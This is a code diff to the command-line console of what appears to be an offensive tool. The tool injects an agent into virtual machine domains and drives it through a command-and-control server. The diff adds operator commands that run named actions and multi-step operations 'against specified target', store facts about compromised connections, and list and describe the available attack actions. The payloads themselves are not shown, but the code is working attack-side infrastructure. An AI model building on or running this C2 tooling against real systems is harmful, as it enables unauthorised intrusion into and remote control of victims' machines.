@@ -1,7 +1,12 @@
+import datetime
+import types
 from vm_drivers import list_domains, inject_domain, InvalidDomain, InvalidSyscall
 from config.conf_manager import read_config, pretty_print_config
 from c2.c2_server import start_multithreaded_c2, list_c2_connections, send_c2_command, read_c2_log, InvalidConnUUID, NotAliveConnection
-import datetime
+from c2.c2_actions import ActionRequirementsNotSatisfied
+import c2.concrete_operations as c2ops
+import c2.concrete_actions as c2actions
+import c2.c2_facts as c2facts
 
 
 changeable = ['win_major_version', 'win_minor_version', 'first_stage_profile', 'second_stage_profile']
@@ -92,11 +97,117 @@ def modconf(_config, _offsets, _args):
         print("You must provide 'conf_parameter' and 'new_value' arguments")
 
 
+def c2action(_config, _offsets, _args):
+    available = [sym for sym in dir(c2actions)
+                 if isinstance(c2actions.__getattribute__(sym), types.FunctionType)]
+    conn_uuid = _args[0]
+    action = _args[1]
+    if action not in available:
+        print("Invalid action. Use 'c2listactions' to see the available actions")
+    else:
+        action_obj: c2actions.C2Action = c2actions.__getattribute__(action)()
+        try:
+            cmd_indexes_list = action_obj.performAction(conn_uuid)
+            cmd_indexes_list = ", ".join([str(i) for i in cmd_indexes_list])
+            print(f"Action completed. Command indexes: {cmd_indexes_list}\n"
+                  "You can use 'c2read' with command indexes to see raw output of commands")
+        except ActionRequirementsNotSatisfied:
+            print("Some required facts is missing for specified action. Check the description "
+                  "with 'c2describeaction'")
+
+
+def c2operation(_config, _offsets, _args):
+    available = [sym for sym in dir(c2ops)
+                 if isinstance(c2ops.__getattribute__(sym), types.FunctionType)]
+    conn_uuid = _args[0]
+    operation = _args[1]
+    if operation not in available:
+        print("Invalid operation. Use 'c2listops' to see the available operations")
+    else:
+        operation_obj: c2ops.C2Operation = c2ops.__getattribute__(operation)()
+        report = operation_obj.performOperation(conn_uuid)
+        print(report)
+
+
+def c2getfact(_config, _offsets, _args):
+    conn_uuid = _args[0]
+    fact_name = _args[1]
+    factsStorage = c2facts.FactsStorage(c2facts.ConnectionStorage(), conn_uuid)
+    try:
+        fact_value = factsStorage.getFact(fact_name)
+        if isinstance(fact_value, list):
+            fact_value = ", ".join(fact_value)
+        print(f"{fact_name}: {fact_value}")
+    except c2facts.NotExistentFact:
+        print("The fact you tried to read is not set for specified connection")
+
+
+def c2setfact(_config, _offsets, _args):
+    conn_uuid = _args[0]
+    fact_name = _args[1]
+    fact_value = _args[2]
+    factsStorage = c2facts.FactsStorage(c2facts.ConnectionStorage(), conn_uuid)
+    try:
+        old_value = factsStorage.getFact(fact_name)
+        print(f"Old {fact_name}: {old_value}")
+    except c2facts.NotExistentFact:
+        print("You're about to create a new fact for specified connection")
+    factsStorage.setFact(fact_name, fact_value)
+    try:
+        new_value = factsStorage.getFact(fact_name)
+        print(f"New {fact_name}: {new_value}")
+    except c2facts.NotExistentFact:
+        print("Some error occurred: the fact has not been set")
+
+
+def c2listactions(_config, _offsets, _args):
+    available = [sym for sym in dir(c2actions)
+                 if isinstance(c2actions.__getattribute__(sym), types.FunctionType)]
+    available = ", ".join(available)
+    print(f"Available actions: {available}")
+
+
+def c2listops(_config, _offsets, _args):
+    available = [sym for sym in dir(c2ops)
+                 if isinstance(c2ops.__getattribute__(sym), types.FunctionType)]
+    available = ", ".join(available)
+    print(f"Available operations: {available}")
+
+
+def c2describeaction(_config, _offsets, _args):
+    available = [sym for sym in dir(c2actions)
+                 if isinstance(c2actions.__getattribute__(sym), types.FunctionType)]
+    action = _args[0]
+    if action not in available:
+        print("Invalid action. Use 'c2listactions' to see the available actions")
+    else:
+        action_obj: c2actions.C2Action = c2actions.__getattribute__(action)()
+        description = action_obj.describeAction()
+        print(description)
+
+
+def c2describeop(_config, _offsets, _args):
+    available = [sym for sym in dir(c2ops)
+                 if isinstance(c2ops.__getattribute__(sym), types.FunctionType)]
+    operation = _args[0]
+    if operation not in available:
+        print("Invalid operation. Use 'c2listops' to see the available operations")
+    else:
+        operation_obj: c2ops.C2Operation = c2ops.__getattribute__(operation)()
+        description = operation_obj.describeOperation()
+        print(description)
+
+
 def command_line_interface(_config, _offsets, stream_req_handler=None):
-    options = ["domlist", "dominject", "c2list", "c2send", "c2read", "showconf", "modconf",
-               "quit", "help", "info"]
+    # TODO: c2listfacts <conn_uuid>
+    options = ["domlist", "dominject", "c2list", "c2send", "c2read", "c2action", "c2operation",
+               "c2getfact", "c2setfact", "c2listactions", "c2listops", "c2describeaction",
+               "c2describeop", "showconf", "modconf", "quit", "help", "info"]
     funcs = {'domlist': domlist, 'dominject': dominject, 'c2list': c2list, 'c2send': c2send,
-             'c2read': c2read, 'showconf': showconf, 'modconf': modconf}
+             'c2read': c2read, 'c2action': c2action, 'c2operation': c2operation,
+             'c2getfact': c2getfact, 'c2setfact': c2setfact, 'c2listactions': c2listactions,
+             'c2listops': c2listops, 'c2describeaction': c2describeaction, 'c2describeop': c2describeop,
+             'showconf': showconf, 'modconf': modconf}
     infos = {'domlist': 'Usage: domlist\nList available domains',
              'dominject': 'Usage: dominject <domain>\nInject agent into domain',
              'c2list': 'Usage: c2list\nList all connections to C2 server',
@@ -104,6 +215,23 @@ def command_line_interface(_config, _offsets, stream_req_handler=None):
              'c2read': 'Usage: c2read <conn_uuid> [cmd_index]\n'
                        'Read data received upon connection if no cmd_index is specified, otherwise read '
                        'command and command output of index specified',
+             'c2action': 'Usage: c2action <conn_uuid> <action_name>\n'
+                         'Start specified action against specified target, '
+                         'performing it synchronously and setting facts',
+             'c2operation': 'Usage: c2operation <conn_uuid> <operation_name>\n'
+                            'Start specified operation against specified target, '
+                            'performing each action synchronously',
+             'c2getfact': 'Usage: c2getfact <conn_uuid> <fact_name>\n'
+                          'Read the specified fact for the specified target, if available',
+             'c2setfact': 'Usage: c2setfact <conn_uuid> <fact_name> <new_fact_value>\n'
+                          'Set or update the specified fact for the specified target; '
+                          'only strings can be set, although facts can also be lists',
+             'c2listactions': 'Usage: c2listactions\nList names of available actions',
+             'c2listops': 'Usage: c2listops\nList names of available operations',
+             'c2describeaction': 'Usage: c2describeaction <action_name>\n'
+                                 'Obtain details about the specified action',
+             'c2describeop': 'Usage: c2describeop <operation_name>\n'
+                             'Obtain details about the specified operation',
              'showconf': 'Usage: showconf\nShow configuration',
              'modconf': 'Usage: modconf <conf_parameter> <new_value>\nChange value of specified parameter\n'
                         f'Changeable values: {", ".join(changeable)}\n'
@@ -133,7 +261,10 @@ def command_line_interface(_config, _offsets, stream_req_handler=None):
             elif option not in funcs:
                 print("Invalid command")
             else:
-                funcs[option](_config, _offsets, choice[1:])
+                try:
+                    funcs[option](_config, _offsets, choice[1:])
+                except IndexError:
+                    print("Insufficient number of arguments")
 
 
 def start_c2(_config):
